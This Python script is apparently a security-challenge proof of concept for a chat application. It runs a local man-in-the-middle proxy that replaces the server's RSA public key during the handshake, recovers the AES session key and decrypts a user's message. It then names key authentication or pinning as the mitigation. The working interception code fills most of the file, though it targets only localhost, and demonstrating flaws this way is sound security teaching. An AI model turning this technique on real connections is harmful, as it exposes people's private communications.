from __future__ import annotations

import json
import os
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from client.client import ChatClient  # noqa: E402
from common import encryption  # noqa: E402


def free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def recv_exact(sock: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        chunk = sock.recv(length - len(chunks))
        if not chunk:
            raise ConnectionError("connection closed while reading")
        chunks.extend(chunk)
    return bytes(chunks)


def wait_for_port(port: int, timeout: float = 5.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"server did not listen on 127.0.0.1:{port}")


def rsa_encrypt(public_key_bytes: bytes, aes_key: bytes) -> bytes:
    public_key = serialization.load_pem_public_key(public_key_bytes)
    return public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


class KeyReplacementProxy:
    def __init__(self, listen_port: int, target_port: int, expected_username: str) -> None:
        self.listen_port = listen_port
        self.target_port = target_port
        self.expected_username = expected_username.encode()
        self.ready = threading.Event()
        self.captured = threading.Event()
        self.captured_payload: dict | None = None
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.listener: socket.socket | None = None
        self.error: BaseException | None = None

    def start(self) -> None:
        self.thread.start()
        if not self.ready.wait(timeout=5):
            raise TimeoutError("MITM proxy did not start")

    def close(self) -> None:
        if self.listener:
            try:
                self.listener.close()
            except OSError:
                pass

    def _run(self) -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
                self.listener = listener
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(("127.0.0.1", self.listen_port))
                listener.listen(1)
                self.ready.set()

                victim_sock, _ = listener.accept()
                with victim_sock, socket.create_connection(("127.0.0.1", self.target_port)) as server_sock:
                    real_key_len = struct.unpack(">I", recv_exact(server_sock, 4))[0]
                    real_public_key = recv_exact(server_sock, real_key_len)

                    attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                    attacker_public_key = attacker_key.public_key().public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo,
                    )

                    victim_sock.sendall(struct.pack(">I", len(attacker_public_key)) + attacker_public_key)

                    encrypted_aes_key = recv_exact(victim_sock, 256)
                    aes_key = attacker_key.decrypt(
                        encrypted_aes_key,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None,
                        ),
                    )
                    server_sock.sendall(rsa_encrypt(real_public_key, aes_key))

                    username = recv_exact(victim_sock, len(self.expected_username))
                    if username != self.expected_username:
                        raise ValueError(f"unexpected demo username: {username!r}")
                    server_sock.sendall(username)

                    threading.Thread(
                        target=self._forward_server_to_client,
                        args=(server_sock, victim_sock),
                        daemon=True,
                    ).start()

                    header = recv_exact(victim_sock, 4)
                    frame_len = struct.unpack(">I", header)[0]
                    frame = recv_exact(victim_sock, frame_len)
                    decrypted = encryption.decrypt_message(frame, aes_key)
                    self.captured_payload = json.loads(decrypted)
                    self.captured.set()
                    server_sock.sendall(header + frame)
        except BaseException as exc:
            self.error = exc
            self.captured.set()

    @staticmethod
    def _forward_server_to_client(server_sock: socket.socket, victim_sock: socket.socket) -> None:
        try:
            while True:
                header = recv_exact(server_sock, 4)
                frame_len = struct.unpack(">I", header)[0]
                frame = recv_exact(server_sock, frame_len)
                victim_sock.sendall(header + frame)
        except (ConnectionError, OSError):
            return


def run_server(port: int, keys_dir: str) -> subprocess.Popen:
    env = os.environ.copy()
    env["IP_ADDRESS"] = "127.0.0.1"
    env["PORT"] = str(port)
    env["GUARDEDIM_KEYS_DIR"] = keys_dir
    return subprocess.Popen(
        [sys.executable, "-m", "server.server"],
        cwd=ROOT,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def main() -> None:
    real_port = free_port()
    proxy_port = free_port()
    username = "alice"
    message = "local MITM demo message"

    with tempfile.TemporaryDirectory() as keys_dir:
        server_proc = run_server(real_port, keys_dir)
        proxy: KeyReplacementProxy | None = None
        alice: ChatClient | None = None
        old_ip = os.environ.get("IP_ADDRESS")
        old_port = os.environ.get("PORT")
        try:
            wait_for_port(real_port)
            proxy = KeyReplacementProxy(proxy_port, real_port, username)
            proxy.start()

            os.environ["IP_ADDRESS"] = "127.0.0.1"
            os.environ["PORT"] = str(proxy_port)

            alice = ChatClient(username, lambda *_: None, lambda *_: None)
            alice.connect()
            time.sleep(0.3)
            if not alice.send_message("bob", message):
                raise SystemExit("[demo] client refused to send demo message")

            if not proxy.captured.wait(timeout=5):
                raise TimeoutError("MITM proxy did not capture a client frame")
            if proxy.error:
                raise proxy.error

            payload = proxy.captured_payload or {}
            print("[demo] Challenge 01: unauthenticated key exchange")
            print("[demo] proxy replaced the server public key during the initial handshake")
            print(f"[demo] captured payload type: {payload.get('type')}")
            print(f"[demo] captured sender: {payload.get('from')}")
            print(f"[demo] captured recipient: {payload.get('to')}")
            print(f"[demo] captured plaintext: {payload.get('payload')}")

            if payload.get("payload") != message:
                raise SystemExit("[demo] expected the proxy to decrypt Alice's plaintext message")

            print("[demo] PASS: a local MITM proxy decrypted the message after replacing the RSA key.")
            print("[demo] Mitigation: authenticate the server key with certificate validation, fingerprint pinning, or another authenticated key exchange.")
        finally:
            if alice:
                alice.disconnect()
            if proxy:
                proxy.close()
            if old_ip is None:
                os.environ.pop("IP_ADDRESS", None)
            else:
                os.environ["IP_ADDRESS"] = old_ip
            if old_port is None:
                os.environ.pop("PORT", None)
            else:
                os.environ["PORT"] = old_port

            server_proc.terminate()
            try:
                server_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                server_proc.kill()
                server_proc.wait(timeout=5)
            if server_proc.stdout:
                server_proc.stdout.close()


if __name__ == "__main__":
    main()
